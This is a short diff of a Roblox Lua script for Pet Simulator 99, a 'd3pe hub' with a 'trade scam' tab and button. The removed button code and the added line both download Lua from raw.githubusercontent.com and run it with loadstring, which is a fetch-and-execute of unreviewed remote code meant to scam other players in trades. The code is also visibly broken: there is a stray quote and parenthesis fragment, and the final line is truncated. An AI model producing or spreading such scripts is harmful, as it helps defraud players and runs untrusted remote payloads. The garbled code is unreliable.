@@ -1,12 +1,1 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("d3pe hub | Pet Simulator 99! ", "BloodTheme")
-
--- MAIN
-local Main = Window:NewTab("trade scam")
-local MainSection = Main:NewSection("pauses pets")
-
-MainSection:NewButton("trade scam !", "pauses your pets", function()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/70eb0b1d850fda19f0d88699.lua'))()", true))()
-
-end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/70eb0b1d850fda19f0d88699.lua
